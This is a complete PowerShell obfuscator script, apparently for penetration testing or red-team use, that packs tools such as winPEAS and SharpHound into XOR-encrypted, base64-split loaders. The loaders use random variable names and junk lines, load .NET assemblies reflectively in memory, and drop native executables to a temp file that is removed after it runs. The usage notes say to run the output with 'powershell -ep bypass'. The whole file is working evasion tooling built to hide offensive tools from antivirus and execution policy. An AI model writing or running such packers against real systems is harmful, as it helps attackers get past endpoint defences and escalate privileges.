<#
Usage:
# basic
.\PowerObfuscator.ps1 winPEAS.exe

# with args passed through
.\PowerObfuscator.ps1 .\PrivescCheck.ps1
.\PowerObfuscator.ps1 SharpHound.exe

Output will be winPEAS_obf.ps1 in the same directory. Then just:

powershell
powershell -ep bypass .\winPEAS_obf.ps1
#>
param(
    [Parameter(Mandatory)][string]$Target,
    [string[]]$PassArgs = @()
)

function Get-RandVar {
    $c = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
    $l = Get-Random -Min 7 -Max 16
    -join ((1..$l) | ForEach-Object { $c[(Get-Random -Max $c.Length)] })
}

function Invoke-XOR {
    param([byte[]]$Data, [byte[]]$Key)
    $r = New-Object byte[] $Data.Length
    for ($i = 0; $i -lt $Data.Length; $i++) {
        $r[$i] = $Data[$i] -bxor $Key[$i % $Key.Length]
    }
    return $r
}

function Split-B64 {
    param([string]$Str, [int]$ChunkSize = 200)
    $parts = @()
    for ($i = 0; $i -lt $Str.Length; $i += $ChunkSize) {
        $end = [Math]::Min($i + $ChunkSize, $Str.Length)
        $parts += "'" + $Str.Substring($i, $end - $i) + "'"
    }
    return $parts -join " + `n    "
}

if (-not (Test-Path $Target)) {
    Write-Host "[-] Not found: $Target"
    exit 1
}

$resolvedPath = (Resolve-Path $Target).Path
$bytes        = [System.IO.File]::ReadAllBytes($resolvedPath)
$ext          = [System.IO.Path]::GetExtension($Target).ToLower()
$baseName     = [System.IO.Path]::GetFileNameWithoutExtension($Target)
$outName      = "${baseName}_obf.ps1"
$outPath      = Join-Path (Split-Path $resolvedPath -Parent) $outName

$keyLen = Get-Random -Min 20 -Max 48
$key    = New-Object byte[] $keyLen
[System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($key)

$xored  = Invoke-XOR $bytes $key
$b64    = [Convert]::ToBase64String($xored)
$b64Key = [Convert]::ToBase64String($key)

$b64Chunked = Split-B64 $b64

$vData    = Get-RandVar
$vKey     = Get-RandVar
$vXored   = Get-RandVar
$vDecBytes= Get-RandVar
$vI       = Get-RandVar
$vAsm     = Get-RandVar
$vEP      = Get-RandVar
$vResult  = Get-RandVar
$vJA      = Get-RandVar
$vJB      = Get-RandVar
$vJC      = Get-RandVar
$vJD      = Get-RandVar

$junkPool = @(
    "`$$vJA = [System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory().Length % 7",
    "`$$vJB = [System.Diagnostics.Process]::GetCurrentProcess().Id",
    "`$$vJC = [System.Environment]::TickCount64 % 1337",
    "`$$vJD = [System.Guid]::NewGuid().ToString().Length",
    "`$$vJA = [System.Math]::Log(256, 2)",
    "`$$vJB = [System.Threading.Thread]::CurrentThread.ManagedThreadId * 0",
    "`$$vJC = [bitconverter]::IsLittleEndian"
)

$j1 = $junkPool | Get-Random
$j2 = $junkPool | Get-Random
$j3 = $junkPool | Get-Random
$j4 = $junkPool | Get-Random

$isNet = $false
try {
    $testAsm = [System.Reflection.Assembly]::ReflectionOnlyLoad($bytes)
    $isNet = $true
} catch {}

if ($ext -eq ".exe" -and $isNet) {
    $loader = @"
$j1
`$$vData = $b64Chunked
$j2
`$$vKey  = [Convert]::FromBase64String('$b64Key')
`$$vXored = [Convert]::FromBase64String(`$$vData)
`$$vDecBytes = New-Object byte[] `$$vXored.Length
for (`$$vI = 0; `$$vI -lt `$$vXored.Length; `$$vI++) {
    `$$vDecBytes[`$$vI] = `$$vXored[`$$vI] -bxor `$$vKey[`$$vI % `$$vKey.Length]
}
$j3
`$$vAsm = [System.Reflection.Assembly]::Load(`$$vDecBytes)
`$$vEP  = `$$vAsm.EntryPoint
$j4
`$$vEP.Invoke(`$null, @(,[string[]]@($( ($PassArgs | ForEach-Object { "'$_'" }) -join ',' ))))
"@
} elseif ($ext -eq ".exe" -and -not $isNet) {
    $tmpVar = Get-RandVar
    $loader = @"
$j1
`$$vData = $b64Chunked
$j2
`$$vKey  = [Convert]::FromBase64String('$b64Key')
`$$vXored = [Convert]::FromBase64String(`$$vData)
`$$vDecBytes = New-Object byte[] `$$vXored.Length
for (`$$vI = 0; `$$vI -lt `$$vXored.Length; `$$vI++) {
    `$$vDecBytes[`$$vI] = `$$vXored[`$$vI] -bxor `$$vKey[`$$vI % `$$vKey.Length]
}
$j3
`$$tmpVar = [System.IO.Path]::GetTempFileName() + '.exe'
[System.IO.File]::WriteAllBytes(`$$tmpVar, `$$vDecBytes)
$j4
& `$$tmpVar $($PassArgs -join ' ')
Remove-Item `$$tmpVar -Force -ErrorAction SilentlyContinue
"@
    Write-Host "[!] Native PE detected — will write to temp on execution (less stealthy)"
} elseif ($ext -eq ".ps1") {
    $loader = @"
$j1
`$$vData = $b64Chunked
$j2
`$$vKey  = [Convert]::FromBase64String('$b64Key')
`$$vXored = [Convert]::FromBase64String(`$$vData)
`$$vDecBytes = New-Object byte[] `$$vXored.Length
for (`$$vI = 0; `$$vI -lt `$$vXored.Length; `$$vI++) {
    `$$vDecBytes[`$$vI] = `$$vXored[`$$vI] -bxor `$$vKey[`$$vI % `$$vKey.Length]
}
$j3
`$$vResult = [System.Text.Encoding]::UTF8.GetString(`$$vDecBytes)
$j4
& ([scriptblock]::Create(`$$vResult))
"@
} else {
    Write-Host "[-] Unsupported: $ext"
    exit 1
}

[System.IO.File]::WriteAllText($outPath, $loader)

$origSize = (Get-Item $resolvedPath).Length
$obfSize  = (Get-Item $outPath).Length

Write-Host "[+] Target   : $resolvedPath"
Write-Host "[+] Type     : $(if ($ext -eq '.ps1') { 'PowerShell' } elseif ($isNet) { '.NET Assembly (reflective)' } else { 'Native PE (temp-drop)' })"
Write-Host "[+] XOR key  : $keyLen bytes"
Write-Host "[+] Original : $origSize bytes"
Write-Host "[+] Output   : $outPath ($obfSize bytes)"
Write-Host "[!] Run with : powershell -ep bypass .\$outName"